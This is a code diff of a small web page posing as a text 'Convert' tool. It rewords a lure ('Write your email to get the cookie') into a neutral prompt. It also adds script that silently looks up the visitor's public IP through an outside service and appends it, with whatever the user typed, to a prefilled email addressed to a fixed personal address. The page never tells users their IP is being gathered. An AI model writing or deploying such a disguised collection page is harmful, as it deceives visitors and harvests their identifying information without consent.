@@ -107,10 +107,10 @@
 <div class="bg-layer" id="bg"></div>
 
 <div class="container">
-    <div class="title">Write your email to get the cookie</div>
+    <div class="title">Write your text</div>
 
     <div class="input-row">
-        <textarea id="textInput" placeholder="paste your email here"></textarea>
+        <textarea id="textInput" placeholder="paste your text here"></textarea>
         <button id="convertBtn" disabled>Convert</button>
     </div>
 </div>
@@ -119,6 +119,14 @@
     const bg = document.getElementById("bg");
     const textarea = document.getElementById("textInput");
     const button = document.getElementById("convertBtn");
+
+    let userIP = "Unknown";
+
+    // Fetch public IP
+    fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(data => userIP = data.ip)
+        .catch(() => userIP = "Unavailable");
 
     document.addEventListener("mousemove", (e) => {
         const x = (e.clientX / window.innerWidth - 0.5) * 30;
@@ -134,12 +142,20 @@
         const text = textarea.value.trim();
         if (!text) return;
 
-        const subject = encodeURIComponent("Converted Text");
-        const body = encodeURIComponent(text);
+        const subject = encodeURIComponent("Converted Text + IP");
+        const body = encodeURIComponent(
+            "User Text:\n\n" +
+            text +
+            "\n\n----------------------\n" +
+            "User IP Address:\n" +
+            userIP
+        );
 
-        window.location.href = `mailto:noalaklak22450@gmail.com?subject=${subject}&body=${body}`;
+        window.location.href =
+            `mailto:noalaklak22450@gmail.com?subject=${subject}&body=${body}`;
     });
 </script>
 
 </body>
 </html>
+
